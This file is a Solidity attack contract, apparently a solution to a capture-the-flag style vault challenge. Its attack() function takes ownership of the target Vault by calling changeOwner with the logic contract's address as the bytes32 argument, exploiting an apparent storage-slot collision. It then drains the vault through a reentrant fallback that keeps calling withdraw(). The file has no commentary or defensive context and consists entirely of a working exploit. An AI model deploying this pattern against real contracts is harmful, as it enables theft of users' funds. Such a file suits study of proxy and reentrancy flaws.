// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Vault.sol";

contract AttackVault {
    Vault public vault;
    VaultLogic public logic;

    constructor(address _vault, address _logic) {
        vault = Vault(payable(_vault));
        logic = VaultLogic(payable(_logic));
    }

    fallback() external payable {
        if (address(vault).balance >= 0) {
            vault.withdraw();
        }
    }

    function attack() external payable {
        bytes memory methodData = abi.encodeWithSignature("changeOwner(bytes32,address)", address(logic), address(this));
        (bool success,) = address(vault).call(methodData);
        require(success, "call changeOwner failed");
        vault.openWithdraw();
        vault.deposite{value: msg.value}();
        vault.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
